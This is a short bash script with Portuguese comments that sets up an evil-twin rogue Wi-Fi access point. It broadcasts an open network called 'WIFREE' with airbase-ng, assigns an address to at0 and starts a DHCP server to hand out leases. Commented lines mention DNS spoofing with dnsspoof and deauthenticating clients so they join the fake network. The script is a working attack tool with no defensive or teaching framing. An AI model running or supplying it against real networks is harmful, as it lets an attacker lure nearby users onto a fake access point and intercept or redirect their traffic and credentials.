#!/bin/bash

#install e config dns

#apt-get install isc-dhcp-server
#cd /etc/default && nano isc-dhcp-server
#ativar conf e interface
#cp dhcpd.conf /etc/dhcp/.

#seta e inicia dhcp
iwconfig wlan1mon channel 1
#Z = tipo cripto eg -Z 4 wlan... | -a = mac bssid
airbase-ng -c 11 -e WIFREE -a AA:BB:CC:DD:EE:FF wlan1mon
#dnsspoof -i at0
#enviar deauth para se conectarem caso evil_twin
ifconfig at0 192.168.2.1 up
service isc-dhcp-server start

